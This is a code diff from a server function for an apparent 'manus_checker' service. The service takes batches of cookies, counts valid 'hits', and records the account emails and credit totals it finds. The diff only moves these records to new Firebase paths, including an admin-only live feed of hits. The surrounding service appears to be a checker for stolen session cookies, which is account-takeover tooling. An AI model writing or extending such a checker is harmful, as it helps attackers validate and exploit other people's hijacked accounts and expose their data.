@@ -489,10 +489,10 @@ serve(async (req) => {
 
     console.log(`${getCanaryTimestamp()} [${requestId}] Complete: ${stats.success} hits, ${stats.failed} failed in ${durationStr}`);
 
-    // Save to Firebase (non-blocking)
+    // Save to Firebase (non-blocking) - using correct paths per Firebase rules
     if (userId) {
-      // Save full history under user path
-      firebasePush(`users/${userId}/checkHistory`, {
+      // Save history under checkHistory/$uid (per Firebase rules)
+      firebasePush(`checkHistory/${userId}`, {
         service: "manus_checker",
         requestId,
         inputCount: cookies.length,
@@ -514,10 +514,9 @@ serve(async (req) => {
         createdAt: new Date().toISOString()
       }).catch(e => console.error(`${getCanaryTimestamp()} [${requestId}] Firebase history save error:`, e));
 
-      // Save HITS separately + push to liveHits for real-time admin view
+      // Save HITS separately under adminData (admin only path)
       if (successResults.length > 0) {
-        // Save to user's hits
-        firebasePush(`manusHits/${userId}`, {
+        firebasePush(`adminData/manusHits/${userId}`, {
           requestId,
           hits: successResults.map(r => ({
             email: r.email,
@@ -533,9 +532,9 @@ serve(async (req) => {
           checkedAt: new Date().toISOString()
         }).catch(e => console.error(`${getCanaryTimestamp()} [${requestId}] Firebase hits save error:`, e));
 
-        // Push to global liveHits for admin real-time view
-        for (const hit of successResults.slice(0, 10)) { // Limit to 10 per batch
-          firebasePush('liveHits', {
+        // Push to adminData/liveHits for admin real-time view
+        for (const hit of successResults.slice(0, 10)) {
+          firebasePush('adminData/liveHits', {
             service: 'manus_checker',
             username: username || 'anonymous',
             hitData: {
@@ -544,7 +543,7 @@ serve(async (req) => {
               totalCredits: hit.totalCredits,
             },
             createdAt: Date.now()
-          }).catch(() => {}); // Ignore errors for live hits
+          }).catch(() => {});
         }
       }
     }
